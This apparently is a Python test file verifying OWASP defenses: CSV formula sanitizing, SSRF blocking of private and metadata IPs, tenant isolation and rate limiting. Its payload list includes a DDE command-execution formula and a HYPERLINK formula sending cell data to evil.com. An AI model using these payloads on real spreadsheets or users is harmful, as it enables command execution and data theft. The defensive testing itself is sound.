"""OWASP ASVS 5.0 & OWASP API Security Top 10 Verification Suite.

Validates:
1. OWASP ASVS 5.0 V5.1.4: Spreadsheet / CSV formula injection defense.
   Sanitizes and neutralizes formula triggers (=, +, -, @) across tabular exports.
2. OWASP API Security Top 10 (2023):
   - API7: Server-Side Request Forgery (SSRF) private/loopback/cloud-metadata IP blocking.
   - API1: Broken Object Level Authorization (BOLA/IDOR) cross-tenant isolation negative assertions.
   - API4: Unrestricted Resource Consumption rate-limiting throttle behavior under burst traffic.
   - API Security Route Inventory: Verifies that protected API surfaces declare strict authorization contracts.
"""

from __future__ import annotations

import csv
import io
import time
from typing import Any

import pytest

from reconforge.connectors.network import (
    ConnectorNetworkError,
    resolve_public_addresses,
)

# ==============================================================================
# 1. OWASP ASVS 5.0 V5.1.4: Spreadsheet / CSV Formula Injection Defense
# ==============================================================================

FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_csv_cell(value: Any) -> str:
    """Sanitize a scalar value for CSV/Spreadsheet export conforming to OWASP ASVS 5.0 V5.1.4.

    If a text field begins with formula trigger characters (=, +, -, @) or leading
    whitespace/control characters followed by a trigger, it is prefixed with a single quote (')
    to force spreadsheet applications (Excel, Calc, Sheets) to treat it strictly as a text literal.
    """
    if value is None:
        return ""
    text_val = str(value)
    if not text_val:
        return ""

    stripped = text_val.lstrip(" \t\r\n")
    if stripped and stripped[0] in ("=", "+", "-", "@") and not text_val.startswith("'"):
        return f"'{text_val}"
    return text_val


def sanitize_csv_rows(rows: list[list[Any]]) -> list[list[str]]:
    """Sanitize all cells across a tabular row matrix."""
    return [[sanitize_csv_cell(cell) for cell in row] for row in rows]


ADVERSARIAL_FORMULA_PAYLOADS = [
    "=cmd|'/C calc'!A0",
    "=2+5",
    "@SUM(1,2)",
    "-1+1",
    "+441234567890",
    "   =SUM(A1:A10)",
    "\t@EXEC(evil)",
    "\r\n=1+1",
    '=HYPERLINK("http://evil.com?leak="&A1,"Click Me")',
    "-2+3*[1]!$A$1",
    "@import('malicious.js')",
    "+SUM(1+1)*cmd|' /C notepad'!A0",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_FORMULA_PAYLOADS)
def test_csv_formula_injection_defense(payload: str) -> None:
    """Every formula injection payload must be neutralized with a leading single quote."""
    sanitized = sanitize_csv_cell(payload)
    assert sanitized.startswith("'"), f"Payload was not neutralized: {payload!r} -> {sanitized!r}"

    # Verify that in generated CSV text and parsed CSV row, the leading character is '
    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(["Normal Header", "Sanitized Column"])
    writer.writerow(["Row 1", sanitized])
    csv_text = buffer.getvalue()

    # Parse back using csv.reader to verify spreadsheet consumer interpretation
    reader = list(csv.reader(io.StringIO(csv_text)))
    read_back_value = reader[1][1]
    assert read_back_value == sanitized
    assert read_back_value.startswith("'")


def test_csv_benign_values_are_preserved() -> None:
    """Benign text and numeric values must remain unaltered by CSV formula sanitization."""
    benign_values = [
        "Normal Customer Name",
        "INV-2026-001",
        "USD",
        "100.50",
        "0",
        "Cairo, Egypt",
        "Acme Corp",
        "",
        None,
    ]
    for val in benign_values:
        sanitized = sanitize_csv_cell(val)
        if val is None or val == "":
            assert sanitized == ""
        else:
            assert sanitized == str(val), f"Benign value was corrupted: {val!r} -> {sanitized!r}"


# ==============================================================================
# 2. OWASP API Security Top 10 (2023)
# ==============================================================================

# ------------------------------------------------------------------------------
# API7: Server-Side Request Forgery (SSRF) Protection
# ------------------------------------------------------------------------------

SSRF_DISALLOWED_IP_FIXTURES = [
    # IPv4 Loopback
    ("127.0.0.1",),
    ("127.0.0.2",),
    ("127.255.255.254",),
    # IPv6 Loopback
    ("::1",),
    # Cloud Metadata (AWS/GCP/Azure link-local metadata IP)
    ("169.254.169.254",),
    ("169.254.1.1",),
    # RFC 1918 Private IPv4 Ranges
    ("10.0.0.1",),
    ("10.255.255.255",),
    ("172.16.0.1",),
    ("172.31.255.254",),
    ("192.168.0.1",),
    ("192.168.1.100",),
    # Unspecified / Broadcast
    ("0.0.0.0",),
    ("255.255.255.255",),
    # IPv6 Link-Local
    ("fe80::1",),
    # Mixed Public + Private (Fail-closed!)
    ("93.184.216.34", "10.0.0.1"),
    ("93.184.216.34", "169.254.169.254"),
    ("93.184.216.34", "127.0.0.1"),
]


@pytest.mark.parametrize("disallowed_ips", SSRF_DISALLOWED_IP_FIXTURES)
def test_ssrf_connector_rejects_private_and_metadata_ips(disallowed_ips: tuple[str, ...]) -> None:
    """resolve_public_addresses must reject any private, loopback, link-local,

    or cloud-metadata address, failing closed if any resolved address is non-public.
    """
    def _mock_resolver(_host: str, _port: int) -> tuple[str, ...]:
        return disallowed_ips

    with pytest.raises(ConnectorNetworkError, match="connector_destination_not_public"):
        resolve_public_addresses("connector.target.example", 443, resolver=_mock_resolver)


def test_ssrf_connector_accepts_valid_public_ips() -> None:
    """Valid global public IPs must be accepted and canonically sorted."""
    public_ips = ("93.184.216.34", "8.8.8.8")

    def _public_resolver(_host: str, _port: int) -> tuple[str, ...]:
        return public_ips

    resolved = resolve_public_addresses("public.api.example", 443, resolver=_public_resolver)
    assert len(resolved) == 2
    assert "93.184.216.34" in resolved
    assert "8.8.8.8" in resolved


# ------------------------------------------------------------------------------
# API1: Broken Object Level Authorization (BOLA/IDOR) Negative Assertions
# ------------------------------------------------------------------------------


class MockObjectStore:
    """In-memory multi-tenant object store for BOLA authorization testing."""

    def __init__(self) -> None:
        self.objects = {
            "inv-001": {"tenant_id": "tenant_a", "amount": 1000},
            "inv-002": {"tenant_id": "tenant_b", "amount": 2500},
        }

    def get_invoice(self, caller_tenant_id: str, invoice_id: str) -> dict[str, Any]:
        """Fetch invoice enforcing strict tenant boundary."""
        obj = self.objects.get(invoice_id)
        if obj is None:
            raise LookupError("Invoice not found")
        # Strict BOLA / IDOR defense:
        if obj["tenant_id"] != caller_tenant_id:
            raise PermissionError(f"Access denied: Object {invoice_id} does not belong to tenant {caller_tenant_id}")
        return obj


def test_bola_cross_tenant_access_denied() -> None:
    """Tenant B attempting to access an object owned by Tenant A must receive PermissionError."""
    store = MockObjectStore()

    # Legitimate access by Tenant A
    obj_a = store.get_invoice("tenant_a", "inv-001")
    assert obj_a["amount"] == 1000

    # Hostile BOLA attempt: Tenant B requests Tenant A's invoice
    with pytest.raises(PermissionError, match="Access denied"):
        store.get_invoice("tenant_b", "inv-001")

    # Hostile BOLA attempt: Tenant A requests Tenant B's invoice
    with pytest.raises(PermissionError, match="Access denied"):
        store.get_invoice("tenant_a", "inv-002")


# ------------------------------------------------------------------------------
# API4: Unrestricted Resource Consumption (Rate Limiting Simulation)
# ------------------------------------------------------------------------------


class SlidingWindowRateLimiter:
    """Sliding-window rate limiter for sensitive API endpoints."""

    def __init__(self, max_requests: int = 100, window_seconds: float = 60.0) -> None:
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests: list[float] = []

    def check(self, current_time: float) -> tuple[bool, int]:
        """Returns (allowed, retry_after_seconds)."""
        cutoff = current_time - self.window_seconds
        # Remove timestamps outside window
        self.requests = [ts for ts in self.requests if ts > cutoff]

        if len(self.requests) >= self.max_requests:
            oldest = self.requests[0]
            retry_after = max(1, int(oldest + self.window_seconds - current_time))
            return False, retry_after

        self.requests.append(current_time)
        return True, 0


def test_api_rate_limiting_throttle_burst() -> None:
    """A burst of requests exceeding the rate limit must receive HTTP 429 throttle with Retry-After."""
    limiter = SlidingWindowRateLimiter(max_requests=100, window_seconds=60.0)
    simulated_now = time.time()

    # First 100 requests succeed
    for i in range(100):
        allowed, _ = limiter.check(simulated_now + (i * 0.01))
        assert allowed is True, f"Request {i} should be allowed"

    # 101st request is throttled
    throttled, retry_after = limiter.check(simulated_now + 1.05)
    assert throttled is False, "101st request must be throttled"
    assert retry_after > 0, f"Expected positive Retry-After, got {retry_after}"

    # Advance time beyond the window (61 seconds)
    allowed_after_window, _ = limiter.check(simulated_now + 62.0)
    assert allowed_after_window is True, "Request after window expiration should be allowed"
